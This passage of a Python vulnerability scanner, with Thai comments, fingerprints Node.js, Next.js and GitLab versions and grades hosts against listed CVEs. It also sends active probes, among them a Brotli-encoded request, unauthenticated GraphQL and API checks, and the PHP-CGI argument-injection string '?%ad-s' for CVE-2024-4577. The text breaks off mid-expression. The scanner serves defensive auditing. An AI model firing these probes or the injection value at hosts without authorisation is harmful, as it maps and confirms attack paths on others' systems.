    # ตรวจจาก URL ที่ crawl พบ (เช่น /_next/static/, /_nuxt/)
    for u in (all_urls or []):
        ul = u.lower()
        if "/_next/" in ul:
            detected = True
            frameworks.add("Next.js")
        elif "/_nuxt/" in ul:
            detected = True
            frameworks.add("Nuxt")

    info = {
        "detected": detected,
        "versions": sorted(node_vers),
        "inferred_range": None,
        "frameworks": sorted(frameworks),
        "brotli_request_accepted": None,
        "brotli_response_supported": False,
        "brotli_evidence": "",
        "outbound_surface": [],
    }
    t_short = min(timeout, 3.5)

    # หากพบสัญญาณ Node.js (หรือยังไม่ทราบเซิร์ฟเวอร์แน่ชัดแต่ไม่ใช่ PHP/IIS) ให้ probe จุดที่อาจเปิดเผยรุ่น Node.js
    if detected or (not fp.get("php_versions") and fp.get("server_family") in ("Unknown", "NGINX")):
        for probe_p in ["/metrics", "/api/version", "/version", "/api/health", "/healthz"]:
            if node_vers:
                break
            try:
                rp = session.get(base + prefix + probe_p, timeout=min(t_short, 2.5), allow_redirects=False)
                if rp.status_code == 200 and len(rp.text or "") < 200000:
                    txt = rp.text or ""
                    for m in NODE_VER_RE.finditer(txt):
                        node_vers.add(m.group(1))
                        detected = True
                        frameworks.add(f"version@{probe_p}")
                    for m in NEXT_VER_RE.finditer(txt):
                        detected = True
                        frameworks.add(f"Next.js {m.group(1)}")
            except requests.RequestException:
                continue

    if not detected:
        return info

    # อนุมานช่วงเวอร์ชัน Node.js ขั้นต่ำ/ที่ใช้งานจากรุ่น Next.js (กรณีซ่อน node -v แต่เปิดเผยรุ่น Next.js)
    for fw in list(frameworks):
        m_nx = re.match(r"Next\.js\s+(\d+)\.(\d+)\.(\d+)", fw, re.I)
        if m_nx and not node_vers:
            nx_maj = int(m_nx.group(1))
            if nx_maj <= 12:
                info["inferred_range"] = ("<=18.x (จาก " + fw + ")", True)   # กระทบแน่นอน
            elif nx_maj in (13, 14):
                info["inferred_range"] = ("18.x–20.x (จาก " + fw + ")", True)

    # ทดสอบ Brotli (CVE-2026-111497):
    # 1) ตรวจว่าเซิร์ฟเวอร์รองรับ Accept-Encoding: br หรือไม่
    # 2) ทดสอบส่งคำขอที่มี Content-Encoding: br (1-byte valid empty Brotli stream b"\x06")
    try:
        r_br = session.get(base + prefix + "/", headers={"Accept-Encoding": "br"}, timeout=t_short)
        ce = (r_br.headers.get("Content-Encoding", "") or "").lower()
        vary = (r_br.headers.get("Vary", "") or "").lower()
        if "br" in ce:
            info["brotli_response_supported"] = True
            info["brotli_evidence"] = "Content-Encoding: br"
        elif "accept-encoding" in vary:
            info["brotli_evidence"] = "Vary: Accept-Encoding"
    except requests.RequestException:
        pass

    try:
        # b"\x0b\x00\x80{}\x03" คือข้อมูลบีบอัด Brotli ที่ถูกต้องของ "{}"
        valid_br_json = b"\x0b\x00\x80{}\x03"
        r_in = session.post(
            base + prefix + "/",
            data=valid_br_json,
            headers={"Content-Type": "application/json", "Content-Encoding": "br"},
            timeout=t_short,
            allow_redirects=False,
        )
        if r_in.status_code in (415, 406, 501):
            info["brotli_request_accepted"] = False
            info["brotli_evidence"] = f"ปฏิเสธ Content-Encoding: br (HTTP {r_in.status_code})"
        elif r_in.status_code < 500:
            # เทียบกับการส่ง Content-Encoding ที่ไม่รู้จัก เพื่อดูว่าเซิร์ฟเวอร์ตรวจและถอดรหัส br จริงหรือไม่
            r_bad = session.post(
                base + prefix + "/",
                data=valid_br_json,
                headers={"Content-Type": "application/json", "Content-Encoding": "rmut-invalid-br"},
                timeout=t_short,
                allow_redirects=False,
            )
            if r_bad.status_code in (400, 415, 406, 501) and r_in.status_code != r_bad.status_code:
                info["brotli_request_accepted"] = True
                info["brotli_evidence"] = f"ยอมรับและถอดรหัส Content-Encoding: br (HTTP {r_in.status_code} vs {r_bad.status_code})"
            elif info["brotli_response_supported"]:
                info["brotli_request_accepted"] = True
                info["brotli_evidence"] = f"เปิดใช้งาน Brotli และรับคำขอ Content-Encoding: br (HTTP {r_in.status_code})"
    except requests.RequestException:
        pass

    # ตรวจหาจุดรับ URL / Outbound Request (สำหรับ DNS/TLS bypass CVE-2026-105482, 105483, 106069)
    for ep_path, ep_meta in (endpoints or {}).items():
        matched_p = [p for p in ep_meta.get("params", []) if p.lower() in URL_FETCH_PARAMS or "url" in p.lower() or "host" in p.lower() or "domain" in p.lower()]
        if matched_p:
            info["outbound_surface"].append(f"{ep_path}?{','.join(sorted(matched_p)[:3])}")

    # หากเป็น Next.js ให้ตรวจ /_next/image ซึ่งทำหน้าที่ดึง URL ภายนอกฝั่งเซิร์ฟเวอร์ (SSR Image Optimizer)
    if any("next" in f.lower() for f in frameworks):
        try:
            r_img = session.get(base + prefix + "/_next/image?url=%2F&w=64&q=75", timeout=t_short, allow_redirects=False)
            if r_img.status_code in (200, 400) and ("url" in (r_img.text or "").lower() or "image" in r_img.headers.get("Content-Type", "").lower()):
                info["outbound_surface"].append("/_next/image?url=")
        except requests.RequestException:
            pass

    info["detected"] = detected
    info["versions"] = sorted(node_vers)
    info["frameworks"] = sorted(frameworks)
    return info


def _analyze_nodejs(fp, node_info=None):
    """วิเคราะห์ช่องโหว่ Node.js ทั้ง 4 รายการ โดยผสานเลขเวอร์ชัน + รุ่น Framework + การทดสอบ Brotli และ Outbound Surface"""
    headers = fp.get("headers", {}) or {}
    blob = " ".join(" ".join(v) for v in headers.values()).lower()
    if node_info is None:
        node_info = {
            "detected": bool(fp.get("nodejs_detected")) or any(sig in blob for sig in NODEJS_SIGNS),
            "versions": fp.get("nodejs_versions") or [],
            "inferred_range": None,
            "frameworks": fp.get("nodejs_frameworks") or [s for s in NODEJS_SIGNS if s in blob],
            "brotli_request_accepted": None,
            "brotli_response_supported": False,
            "brotli_evidence": "",
            "outbound_surface": [],
        }

    detected = bool(node_info.get("detected"))
    vers = [v for v in (node_info.get("versions") or []) if parse_semver(v)]
    fws = node_info.get("frameworks") or []
    fw_label = ", ".join(fws[:3]) if fws else "Node.js"
    inferred = node_info.get("inferred_range")
    br_req = node_info.get("brotli_request_accepted")
    br_resp = node_info.get("brotli_response_supported")
    br_ev = node_info.get("brotli_evidence") or ""
    outbound = node_info.get("outbound_surface") or []
    cdn = fp.get("cdn_proxy")   # ถ้าอยู่หลัง CDN/Proxy การถอด Brotli อาจทำที่ proxy ไม่ใช่ Node

    out = {}
    for cve, meta in NODEJS_CVES.items():
        r = {"cve": cve, "name": meta["name"], "severity": meta["severity"],
             "host_check": meta["host_check"], "status": "n/a", "reason": ""}
        if not detected:
            r["status"] = "n/a"
            r["reason"] = "ไม่พบสัญญาณการใช้ Node.js จากภายนอก"
            out[cve] = r
            continue

        # 1) กรณีสกัดเลขเวอร์ชัน Node.js ได้ชัดเจน
        if vers:
            ver_str = vers[0]
            v_cls = classify_nodejs(parse_semver(ver_str))
            if v_cls == "patched":
                r["status"] = "patched"
                r["reason"] = f"ตรวจพบ Node.js {ver_str} ({fw_label}) แพตช์แล้ว"
                out[cve] = r
                continue
            # เวอร์ชันอยู่ในช่วงมีช่องโหว่
            if cve == "CVE-2026-111497":
                if (br_req is True or br_resp) and not cdn:
                    r["status"] = "vulnerable"
                    r["reason"] = f"Node.js {ver_str} มีช่องโหว่ + ยืนยันเปิดใช้งาน Brotli ({br_ev})"
                elif (br_req is True or br_resp) and cdn:
                    r["status"] = "likely-vulnerable"
                    r["reason"] = f"Node.js {ver_str} มีช่องโหว่ + พบ Brotli ({br_ev}) แต่อยู่หลัง {cdn} — การถอด br อาจทำที่ proxy ไม่ใช่ Node ต้องยืนยันที่ต้นทาง"
                elif br_req is False:
                    r["status"] = "vulnerable-version"
                    r["reason"] = f"Node.js {ver_str} อยู่ในช่วงกระทบ (บล็อก Content-Encoding: br หน้าบ้าน แต่ควรอัปเกรดทันที)"
                else:
                    r["status"] = "likely-vulnerable"
                    r["reason"] = f"Node.js {ver_str} ({fw_label}) อยู่ในช่วงได้รับผลกระทบ"
            else:
                if outbound:
                    r["status"] = "vulnerable"
                    r["reason"] = f"Node.js {ver_str} มีช่องโหว่ + พบจุดรับ URL/Outbound ({', '.join(outbound[:2])})"
                else:
                    r["status"] = "vulnerable-version"
                    r["reason"] = f"Node.js {ver_str} ({fw_label}) อยู่ในช่วงกระทบ (ไม่พบพารามิเตอร์รับ URL สาธารณะ — ตรวจโค้ดฝั่งเซิร์ฟเวอร์)"
            out[cve] = r
            continue

        # 2) กรณีซ่อนเลขเวอร์ชัน Node.js แต่สามารถอนุมานจากรุ่น Framework หรือผลทดสอบ Precondition
        if cve == "CVE-2026-111497":  # Brotli RCE
            if br_req is True and cdn:
                r["status"] = "not-exploitable"
                r["reason"] = f"พบ {fw_label} แต่อยู่หลัง {cdn} ซึ่งจัดการ Content-Encoding: br ที่ชั้น Proxy ไม่ส่งถึง Node.js โดยตรง"
            elif br_req is True:
                r["status"] = "likely-vulnerable" if inferred else "vulnerable-conditions"
                inf_txt = f" [อนุมาน Node {inferred[0]}]" if inferred else ""
                r["reason"] = f"พบ {fw_label}{inf_txt} + ยืนยันเซิร์ฟเวอร์รับการบีบอัด Brotli ({br_ev}) — ต้องตรวจ node -v บนเครื่อง"
            elif br_req is False and not br_resp:
                r["status"] = "mitigated"
                r["reason"] = f"พบ {fw_label} แต่เซิร์ฟเวอร์ปฏิเสธคำขอ Brotli ({br_ev})"
            elif inferred and br_resp:
                r["status"] = "likely-vulnerable"
                r["reason"] = f"พบ {fw_label} อนุมาน Node {inferred[0]} + เปิดใช้งาน Brotli ({br_ev or 'br'}) — ควรตรวจบนเครื่อง"
            else:
                r["status"] = "not-exploitable"
                r["reason"] = f"พบ {fw_label} แต่ไม่พบการเปิดรับ Content-Encoding: br ที่เข้าเงื่อนไขช่องโหว่"
        else:  # DNS NUL (105482) / TLS Unicode IP (105483) / TLS Identity Bypass (106069)
            if outbound and inferred:
                # สองสัญญาณตรงกัน (จุดรับ URL + อนุมานเวอร์ชันในช่วงกระทบ) จึงจะชี้ว่าเข้าเงื่อนไข
                r["status"] = "vulnerable-conditions"
                r["reason"] = f"พบ {fw_label} [อนุมาน Node {inferred[0]}] + จุดรับ URL/Outbound ({', '.join(outbound[:2])}) — สองสัญญาณตรงกัน ต้องตรวจ node -v บนเครื่อง"
            elif inferred:
                r["status"] = "vulnerable-version"
                r["reason"] = f"พบ {fw_label} อนุมาน Node {inferred[0]} ในช่วงกระทบ (ไม่พบพารามิเตอร์รับ URL สาธารณะ)"
            else:
                r["status"] = "not-exploitable"
                r["reason"] = f"พบ {fw_label} แต่ไม่พบหลักฐานรุ่น Node.js ที่เปราะบางร่วมกับจุดรับ Outbound URL"
        out[cve] = r

    # ── เทียบ CVE ย้อนหลังตามเลขเวอร์ชัน Node.js (affected range → fixed version) ──
    # เช่น CVE-2021-22930 (HTTP/2 UAF RCE) กระทบ <12.22.4 / <14.17.4 / <16.6.0
    if detected and vers:
        _vts = [parse_semver(v) for v in vers if parse_semver(v)]
        for _vt in _vts:
            for cid, hf in _match_historical_cves("Node.js", _vt, fp).items():
                out.setdefault(cid, hf)
        if _vts:
            uf = _unsupported_finding("Node.js", min(_vts))
            if uf:
                out[uf["cve"]] = uf
    return out


# ─── GitLab (CVE-2026-110264) — ตรวจจับหลายช่องทาง + ช่วงเวอร์ชันที่กระทบ ─────────────────
GITLAB_CVES = {
    "CVE-2026-110264": {
        "name": "GitLab CVE-2026-110264",
        "severity": "High",
        "affected": [
            # lower bound = 16.0.0: CVE นี้เกี่ยวกับ authentication path ที่เพิ่มใน GitLab 16.x
            # GitLab < 16.0.0 (ก่อน May 2023) เป็น EOL อยู่แล้ว และ code path นี้ยังไม่มี
            {"ge": "16.0.0", "lt": "18.5.2"},
            {"ge": "18.6.0", "lt": "18.6.2"},
            {"ge": "18.7.0", "lt": "18.7.1"},
        ],
        "fixed": "18.5.2 / 18.6.2 / 18.7.1",
        "patch_date": "2026-04-01",
        "eol_before": "16.0.0",   # รุ่นก่อนนี้ไม่ได้รับ security patch แล้ว — แจ้งแยกต่างหาก
        "host_check": "ตรวจเวอร์ชัน GitLab: Admin Area → Help, หรือ `gitlab-rake gitlab:env:info` (ต้อง >= 18.5.2 / 18.6.2 / 18.7.1)",
    },
}
GITLAB_HDR_SIGNS = ("gitlab", "x-gitlab", "_gitlab_session")


def _ver_tuple(v):
    try:
        return tuple(int(x) for x in re.findall(r"\d+", v)[:3])
    except Exception:
        return ()


def _ver_in_affected(ver, spec):
    """คืน True=อยู่ในช่วงกระทบ, False=นอกช่วง, None=ตัดสินไม่ได้
    รองรับทั้ง spec แบบ dict เดี่ยว และ list ของ dict (หลายกิ่งเวอร์ชัน)"""
    if not ver or not spec:
        return None
    vt = _ver_tuple(ver)
    if not vt:
        return None
    if isinstance(spec, (list, tuple)):
        results = [_ver_in_affected(ver, s) for s in spec if isinstance(s, dict)]
        if any(x is True for x in results):
            return True
        if results and all(x is False for x in results):
            return False
        return None
    if "lt" in spec and not (vt <  _ver_tuple(spec["lt"])):
        return False
    if "le" in spec and not (vt <= _ver_tuple(spec["le"])):
        return False
    if "ge" in spec and not (vt >= _ver_tuple(spec["ge"])):
        return False
    if "gt" in spec and not (vt >  _ver_tuple(spec["gt"])):
        return False
    return True


def _gitlab_probe(session, base, prefix, timeout):
    """ตรวจว่าโฮสต์เป็น GitLab หรือไม่ + สกัดเวอร์ชัน/วันที่สร้างแพ็กเกจ (Build Date) + พื้นผิวการโจมตี (GraphQL/Public API)"""
    from email.utils import parsedate_to_datetime
    info = {
        "detected": False,
        "version": "",
        "revision": "",
        "build_date": "",
        "evidence": "",
        "graphql_open": False,
        "public_api_open": False,
        "signup_open": False,
    }
    t_short = min(timeout, 4.0)
    asset_urls = []

    # 1) ตรวจ /-/manifest.json
    try:
        r = session.get(base + prefix + "/-/manifest.json", timeout=t_short)
        if r.status_code == 200 and "gitlab" in (r.text or "").lower():
            info["detected"] = True
            info["evidence"] = "/-/manifest.json"
    except requests.RequestException:
        pass

    # 2) ตรวจ /users/sign_in (ทั้งการมีอยู่ของ GitLab, window.gon, ลิงก์ไฟล์ asset และการเปิดรับสมัครสมาชิก)
    try:
        r = session.get(base + prefix + "/users/sign_in", timeout=t_short)
        blob = (r.text or "")[:60000]
        sc = (r.headers.get("set-cookie", "") or "").lower()
        hdr_keys = {k.lower() for k in r.headers.keys()}
        if r.status_code in (200, 302) and (
            "gitlab" in blob.lower() or "_gitlab_session" in sc or "x-gitlab-meta" in hdr_keys
        ):
            info["detected"] = True
            if not info["evidence"]:
                info["evidence"] = "/users/sign_in"
        if "/users/sign_up" in blob or 'data-qa-selector="register_tab"' in blob:
            info["signup_open"] = True
        for pat in (
            r"GitLab (?:Community|Enterprise) Edition[^0-9]{0,40}(\d+\.\d+\.\d+)",
            r'"version"\s*:\s*"v?(\d+\.\d+\.\d+)"',
            r"gon\.version\s*=\s*['\"]v?(\d+\.\d+\.\d+)['\"]",
        ):
            m = re.search(pat, blob)
            if m:
                info["version"] = m.group(1)
                break
        m_rev = re.search(r'"revision"\s*:\s*"([0-9a-f]{7,40})"', blob)
        if m_rev:
            info["revision"] = m_rev.group(1)
        for m_asset in re.finditer(r'href=["\']((?:https?://[^"\']+)?/assets/application-[0-9a-f]{16,}\.css)["\']', blob):
            asset_urls.append(urljoin(base + prefix + "/", m_asset.group(1)))
    except requests.RequestException:
        pass

    if not info["detected"]:
        headers = session.headers
        return info

    # 3) หากยังไม่พบเลขเวอร์ชัน ให้ลองดึงจาก /api/v4/version, /api/v4/metadata และ /help
    if not info["version"]:
        for ep in ["/api/v4/version", "/api/v4/metadata", "/help"]:
            try:
                r_ep = session.get(base + prefix + ep, timeout=min(t_short, 2.5), allow_redirects=True)
                if r_ep.status_code == 200:
                    txt = (r_ep.text or "")[:30000]
                    m = re.search(r'"version"\s*:\s*"v?(\d+\.\d+\.\d+)"', txt) or \
                        re.search(r"GitLab (?:Community|Enterprise) Edition[^0-9]{0,40}(\d+\.\d+\.\d+)", txt)
                    if m:
                        info["version"] = m.group(1)
                        info["evidence"] = ep
                        break
            except requests.RequestException:
                continue

    # 4) สกัดวันที่คอมไพล์แพ็กเกจ GitLab (Last-Modified) จาก /assets/webpack/manifest.json หรือไฟล์ CSS หลัก
    asset_cands = [base + prefix + "/assets/webpack/manifest.json"] + asset_urls[:2]
    for au in asset_cands:
        try:
            ra = session.head(au, timeout=min(t_short, 2.5), allow_redirects=True)
            if ra.status_code in (405, 403, 404):
                ra = session.get(au, timeout=min(t_short, 2.5), stream=True)
            lm = ra.headers.get("Last-Modified")
            if ra.status_code == 200 and lm:
                dt = parsedate_to_datetime(lm)
                info["build_date"] = dt.strftime("%Y-%m-%d")
                break
        except Exception:
            continue

    # 5) ตรวจพื้นผิวการเข้าถึงแบบไม่ล็อกอิน (Unauthenticated GraphQL / Public Projects API)
    try:
        rg = session.post(
            base + prefix + "/api/graphql",
            json={"query": "{__typename}"},
            timeout=min(t_short, 2.5),
            allow_redirects=False,
        )
        if rg.status_code == 200 and "Query" in (rg.text or ""):
            info["graphql_open"] = True
    except requests.RequestException:
        pass

    try:
        rp = session.get(base + prefix + "/api/v4/projects?per_page=1", timeout=min(t_short, 2.5), allow_redirects=False)
        if rp.status_code == 200 and rp.text.strip().startswith("["):
            info["public_api_open"] = True
    except requests.RequestException:
        pass

    return info


def _analyze_gitlab(fp, gl):
    """วิเคราะห์สถานะ GitLab ต่อ CVE-2026-110264 โดยใช้เลขเวอร์ชัน, วันที่สร้างไฟล์ระบบ (Build Date) และพื้นผิว Public API/GraphQL"""
    headers = fp.get("headers", {}) or {}
    sc_blob = " ".join(headers.get("set-cookie", [])).lower()
    hdr_keys = {k.lower() for k in headers.keys()}
    detected = bool(gl.get("detected")) or ("_gitlab_session" in sc_blob) or any(k.startswith("x-gitlab") for k in hdr_keys)
    ver = gl.get("version", "")
    bdate = gl.get("build_date", "")
    ev = gl.get("evidence") or "header"
    surfaces = []
    if gl.get("graphql_open"):
        surfaces.append("GraphQL เปิดสาธารณะ")
    if gl.get("public_api_open"):
        surfaces.append("Public API เปิดสาธารณะ")
    if gl.get("signup_open"):
        surfaces.append("เปิดสมัครสมาชิกเอง")
    surf_txt = ", ".join(surfaces) if surfaces else "จำกัดเฉพาะหน้าล็อกอิน"

    out = {}
    for cve, meta in GITLAB_CVES.items():
        r = {"cve": cve, "name": meta["name"], "severity": meta["severity"],
             "host_check": meta["host_check"]}
        if not detected:
            r["status"] = "n/a"
            r["reason"] = "ไม่พบสัญญาณการใช้ GitLab จากภายนอก"
            out[cve] = r
            continue

        verdict = _ver_in_affected(ver, meta.get("affected"))
        eol_before = meta.get("eol_before", "")
        ver_is_eol = bool(ver and eol_before and _ver_tuple(ver) < _ver_tuple(eol_before))
        if verdict is True:
            r["status"] = "vulnerable" if surfaces else "likely-vulnerable"
            r["reason"] = f"พบ GitLab เวอร์ชัน {ver} ({ev}) อยู่ในช่วงที่ได้รับผลกระทบ (< {meta.get('fixed')}) · พื้นผิว: {surf_txt}"
        elif verdict is False and ver_is_eol:
            # เวอร์ชันเก่ากว่า lower bound ของ CVE นี้ — ไม่ใช่ช่วงที่กระทบโดยตรง
            # แต่เป็น EOL แล้ว ต้องแจ้งให้อัปเกรด
            r["status"] = "not-exploitable"
            r["reason"] = (f"พบ GitLab เวอร์ชัน {ver} ({ev}) เก่ากว่าช่วงที่ CVE นี้กระทบ "
                           f"(ต่ำกว่า {eol_before}) — ไม่ได้รับ security patch จาก GitLab อีกแล้ว ควรอัปเกรดทันที")
        elif verdict is False:
            r["status"] = "patched"
            r["reason"] = f"พบ GitLab เวอร์ชัน {ver} ({ev}) แพตช์แล้ว (>= {meta.get('fixed')})"
        elif bdate:
            patch_dt = meta.get("patch_date", "2026-04-01")
            if bdate < patch_dt:
                r["status"] = "likely-vulnerable" if surfaces else "vulnerable-version"
                r["reason"] = (f"พบ GitLab ({ev}) ซ่อนเลขเวอร์ชัน แต่ชุดไฟล์ระบบคอมไพล์เมื่อ {bdate} "
                               f"(เก่ากว่าแพตช์ {patch_dt}) · พื้นผิว: {surf_txt}")
            else:
                r["status"] = "patched"
                r["reason"] = f"พบ GitLab ({ev}) ชุดไฟล์ระบบอัปเดตเมื่อ {bdate} (ใหม่กว่าวันที่ออกแพตช์ {patch_dt})"
        elif surfaces:
            r["status"] = "vulnerable-conditions"
            r["reason"] = f"พบ GitLab ({ev}) ซ่อนเลขเวอร์ชัน แต่เปิด {surf_txt} ให้เข้าถึงได้โดยไม่ต้องล็อกอิน — ต้องตรวจรุ่นบนเครื่อง"
        else:
            r["status"] = "mitigated"
            r["reason"] = f"พบ GitLab ({ev}) ซ่อนเลขเวอร์ชัน และปิดกั้น Public API/GraphQL สำหรับผู้ใช้ไม่ล็อกอิน (ลดความเสี่ยงจากภายนอก)"
        out[cve] = r
    return out


def scan_single_target(target_str, opts, idx=1, total=1):
    prefix = f"[{idx}/{total}]" if total > 1 else "[*]"
    _v = (total <= 1) or opts.get("verbose")
    _v and print(f"\n{prefix} {target_str}")

    base, path_prefix = normalize_target(target_str)
    session = make_session(opts.get("no_verify_ssl", False))

    fp = _fingerprint(session, base, path_prefix, opts["timeout"], opts.get("verbose"))
    if not fp["reachable"] and base.startswith("https://"):
        base_alt = "http://" + base[8:]
        fp_alt = _fingerprint(session, base_alt, path_prefix, opts["timeout"], opts.get("verbose"))
        if fp_alt["reachable"]:
            base, fp = base_alt, fp_alt
    if not fp["reachable"]:
        _v and print(f"    ❌ unreachable")
        return {"target": target_str, "reachable": False, "error": "unreachable"}

    _v and print(f"    Server: {fp['server_family']}" +
          (f" {fp['server_version']}" if fp["server_version"] else "") +
          f" | SAPI: {fp['sapi']} | PHP: {', '.join(sorted(fp['php_versions'])) or '?'}")

    endpoints, visited, baseline_hash, baseline_status, all_urls = _crawl(
        session, base, path_prefix, opts["depth"], opts["max_pages"],
        opts["timeout"], opts.get("verbose"), opts.get("crawl_budget", 30), fp=fp)
    _v and print(f"    Crawl: {len(visited)} pages, {len(endpoints)} endpoints")

    cms_info = _detect_cms(session, base, path_prefix, opts["timeout"], all_urls)
    if cms_info.get("cms") in ("WordPress", "Drupal", "Joomla", "Nextcloud"):
        fp["php_detected"] = True
        if f"CMS:{cms_info['cms']}" not in fp.get("php_evidence", []):
            fp.setdefault("php_evidence", []).append(f"CMS:{cms_info['cms']}")
    app_cves = _analyze_apps(cms_info)
    device_cves = _analyze_device(fp)
    component_cves = _analyze_components(fp)
    exposure_cves = _probe_exposures(session, base, path_prefix, opts["timeout"], fp=fp)
    # ตรวจ error page (404/400) ดึง OS/engine/เวอร์ชัน/path ที่หน้าแรกมักซ่อน — เรียกก่อน _probe_os เพื่อให้ได้ประโยชน์
    exposure_cves.update(_probe_error_pages(session, base, path_prefix, fp, opts["timeout"]))
    framework_cves = _probe_framework(session, base, path_prefix, fp, opts["timeout"])
    _detect_waf(fp)
    header_cves = _audit_security_headers(fp, base)
    tls_cves = {}
    if base.startswith("https://"):
        _tp = urlparse(base)
        tls_cves = _probe_tls(_tp.hostname or "", _tp.port or 443, opts["timeout"], fp=fp)
    # ── DNS → IP + ตัดสินใจโหมด LAN (เปิดเองเมื่อเป้าหมายเป็น IP ภายใน หรือสั่ง --lan) ──
    import socket as _sock
    _scan_host = base.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    try:
        _ip_list = list(set(i[4][0] for i in _sock.getaddrinfo(_scan_host, None, _sock.AF_INET)))
        _resolved_ip = _ip_list[0] if _ip_list else ""
    except Exception:
        _resolved_ip = ""
    # โหมดสแกน: auto (ดีฟอลต์—เปิด LAN เองเมื่อ IP ภายใน) / lan (บังคับเปิด) / external (บังคับปิด)
    _sm = opts.get("scan_mode", "auto")
    if _sm == "lan" or opts.get("lan_mode"):
        _lan = True
    elif _sm == "external":
        _lan = False
    else:  # auto
        _lan = (_is_private_ip(_resolved_ip) is True)
    fp["lan_mode"] = _lan
    fp["scan_mode"] = _sm
    _lan and _v and print(f"    🏠 โหมด LAN: เปิด (nmap -O/ARP + MAC/OUI + TTL เชื่อมั่นสูงขึ้น)")
    _probe_os(urlparse(base).hostname or "", fp, opts["timeout"], lan=_lan)
    # MAC + ผู้ผลิต (เฉพาะเป้าหมายในวง LAN เดียวกัน — IP ส่วนตัว); โหมด LAN prime ARP + OUI เสมอ
    _probe_mac(_resolved_ip, fp, opts, lan=_lan)
    _sel0 = opts.get("selected_cves")
    oskernel_cves = _analyze_os_kernel(fp) if (not _sel0 or "CVE-2026-98432" in _sel0) else {}
    oskernel_cves.update(_analyze_os_eol(fp))   # OS/distro หมดอายุ (EOL) — เตือนเสมอ
    fp["stack_layers"] = _stack_profile(fp, cms_info)
    _v and fp["stack_layers"] and print(f"    Stack: {' → '.join(fp['stack_layers'])}")
    online_cves = _online_cve_scan(fp, cms_info, opts)
    if online_cves:
        _v and print(f"    🌐 Online CVE: พบ {len(online_cves)} รายการจากการค้นสด")
    session_info = _detect_session(session, base, path_prefix, endpoints, opts["timeout"])
    if session_info.get("session_used"):
        fp["php_detected"] = True
        if "PHPSESSID" not in fp.get("php_evidence", []):
            fp.setdefault("php_evidence", []).append("PHPSESSID")
    # อัปเดต SAPI หากเพิ่งตรวจพบ PHP จากตอน crawl / CMS / session
    if fp.get("php_detected") and fp.get("sapi") in ("none", "unknown"):
        if fp.get("server_family") in ("NGINX", "OpenResty"):
            fp["sapi"] = "php-fpm"
        elif fp.get("server_family") == "Apache":
            fp["sapi"] = "mod_php"
        elif fp.get("server_family") == "IIS":
            fp["sapi"] = "php-cgi"
        else:
            fp["sapi"] = "php-unknown"
    session_url = _detect_session_endpoint(session, base, path_prefix, opts["timeout"])
    pc = _probe_preconditions(session, session_url, opts["timeout"])
    pc["meaningful"] = pc.get("meaningful", False) and session_info["session_used"]

    hints = _probe_nginx_hints(session, base, path_prefix, fp, all_urls, opts["timeout"])

    lfi_results = []
    if not opts.get("skip_lfi") and endpoints:
        lfi_results = _lfi_scan(session, base, endpoints, baseline_hash,
                                  opts["timeout"], opts["rate"], opts["lfi_threads"])
        if lfi_results:
            _v and print(f"    ⚠ LFI: {len(lfi_results)} candidate(s)")

    selected = opts.get("selected_cves")  # set of CVE IDs or None
    need_nginx = not selected or any(c in NGINX_VULN for c in selected)
    need_php = not selected or any(c in ("CVE-2026-109618", "CVE-2026-109619") for c in selected)
    need_115560 = not selected or ("CVE-2026-115560" in selected)
    need_node = not selected or any(c in NODEJS_CVES for c in selected)
    need_gitlab = not selected or any(c in GITLAB_CVES for c in selected)

    nginx_cves = _analyze_nginx(fp, hints) if need_nginx else {}
    php_cves = _analyze_php(fp, pc) if need_php else {}
    cve_115560 = _analyze_115560(fp, pc) if need_115560 else None

    if need_node:
        node_info = _nodejs_probe(session, base, path_prefix, fp, endpoints, all_urls, opts["timeout"])
        nodejs_cves = _analyze_nodejs(fp, node_info)
    else:
        nodejs_cves = {}

    if need_gitlab:
        gl_info = _gitlab_probe(session, base, path_prefix, opts["timeout"])
        gitlab_cves = _analyze_gitlab(fp, gl_info)
    else:
        gitlab_cves = {}

    container_cves = _probe_container_layer(session, base, fp, opts["timeout"])

    # ── กลุ่ม 6: ตรวจสอบความเสี่ยง Windows + PHP (CVE-2024-4577) ──
    win_php_cves = {}
    is_win = "windows" in (fp.get("os") or "").lower() or fp.get("server_family") == "IIS"
    is_win_stack = any(x in (fp.get("stack") or []) for x in ("XAMPP", "WampServer", "Laragon"))
    if (is_win or is_win_stack) and fp.get("php_detected"):
        if "CVE-2024-4577" not in php_cves:
            win_php_cves["CVE-2024-4577"] = {
                "cve": "CVE-2024-4577",
                "name": "PHP-CGI Argument Injection RCE (CVE-2024-4577)",
                "severity": "Critical",
                "trigger": "ตรวจพบระบบปฏิบัติการ Windows ร่วมกับการติดตั้งใช้งาน PHP",
                "host_check": "php -v ; ยืนยันว่า PHP >= 8.1.29 / 8.2.20 / 8.3.8 หรือปิด ScriptAlias php-cgi",
                "status": "likely-vulnerable" if fp.get("sapi") in ("php-cgi", "cgi") else "vulnerable-conditions",
                "reason": "ระบบรัน PHP บน Windows (เสี่ยงต่อ CVE-2024-4577 CVSS 9.8) ซึ่งส่งผลให้โจมตีสั่งรันคำสั่งอันตราย (RCE) ได้หากใช้งานโหมด CGI/FastCGI",
            }
        try:
            r_cve = session.get(base + path_prefix + "/?%ad-s", timeout=min(opts["timeout"], 4.0), allow_redirects=False)
            if r_cve.status_code == 200 and ("<code><span" in r_cve.text or "style=\"color: #" in r_cve.text or "class=\"html\"" in r_cve.text):
                php_cves.pop("CVE-2024-4577", None)  # ยืนยันด้วย active probe แล้ว → ใช้ผลนี้ กันซ้ำกับผลเทียบเวอร์ชัน
                win_php_cves["CVE-2024-4577"] = {
                    "cve": "CVE-2024-4577",
                    "name": "CVE-2024-4577 ยืนยันพบช่องโหว่ (PHP-CGI Argument Injection RCE)",
                    "severity": "Critical",
                    "trigger": "ส่ง query ?%ad-s แล้วเซิร์ฟเวอร์ตอบกลับ syntax highlight (Argument Injection สำเร็จ)",
                    "host_check": "อัปเดต PHP เป็น >= 8.1.29 / 8.2.20 / 8.3.8 หรือลบ ScriptAlias /php-cgi/ ทันที",
                    "status": "vulnerable",
                    "reason": "ยืนยันผลด้วยการส่ง Argument %ad-s ไปยัง PHP-CGI แล้วตอบสนอง syntax highlight — ยืนยันว่ามีช่องโหว่ RCE ระดับวิกฤต (CVSS 9.8)",
                }
        except Exception:
            pass

    all_r = (list(nginx_cves.values()) + list(php_cves.values()) +
             ([cve_115560] if cve_115560 else []) +
             list(win_php_cves.values()) +
             list(container_cves.values()) +
             list(nodejs_cves.values()) + list(gitlab_cves.values()) +
             list(app_cves.values()) + list(device_cves.values()) +
             list(component_cves.values()) + list(exposure_cves.values()) +
             list(framework_cves.values()) + list(header_cves.values()) +
